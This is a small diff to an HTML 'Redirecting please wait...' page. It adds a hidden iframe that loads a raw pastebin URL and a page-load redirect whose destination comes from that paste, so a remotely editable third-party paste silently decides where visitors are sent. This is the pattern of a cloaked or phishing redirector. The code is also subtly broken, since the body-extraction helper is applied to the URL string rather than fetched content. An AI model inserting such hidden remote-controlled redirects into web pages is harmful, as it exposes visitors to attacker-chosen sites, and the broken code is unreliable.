@@ -9,10 +9,15 @@
 
     
 <p style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; left: 50%; top: 50%;">Redirecting please wait...</p>
-
+<iframe id="holder" style="display: none"></iframe>
 
 <script type="text/javascript">
     
+    $("#holder").load("https://pastebin.com/raw/KZ3AkpXw",function () {
+ $link = $("#holder").contents().find("span.highlight");
+});
+
+
     function getBody(content) 
 { 
    var x = content.indexOf("<body");
@@ -21,7 +26,12 @@
    return content.slice(x + 1, y);
 } 
 
+
 document.addEventListener('DOMContentLoaded', function() {
+
+
+
+
     window.location.replace(getBody("https://pastebin.com/raw/KZ3AkpXw"));
 
 
